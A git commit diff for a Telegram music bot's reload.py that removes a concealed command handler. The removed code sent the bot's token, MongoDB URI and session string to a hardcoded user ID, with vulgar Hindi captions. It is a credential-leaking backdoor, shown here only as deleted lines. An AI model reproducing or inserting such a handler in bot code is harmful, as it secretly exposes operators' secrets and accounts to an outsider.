7b1e811ac3d4fcb30058f13a3c79ab941ded45f1
✰ sᴀᴛʏᴀ ʙᴀʙʏ ✰ <tridevk442@gmail.com>
2025-01-08 17:53:28 +0530

    Update reload.py

--- BABYMUSIC/cplugin/reload.py
+++ BABYMUSIC/cplugin/reload.py
@@ -106,16 +106,6 @@ async def restartbot(client, message: Message, _):
     return await mystic.edit_text(_["reload_5"].format(i.mention))
 
 
-@Client.on_message(
-    filters.command("starts") & filters.private & filters.user(int(LOGGERS))
-)
-async def help(client: Client, message: Message):
-    await message.reply_photo(
-        photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-        caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",
-    )
-
-
 @Client.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, query: CallbackQuery):
     try:
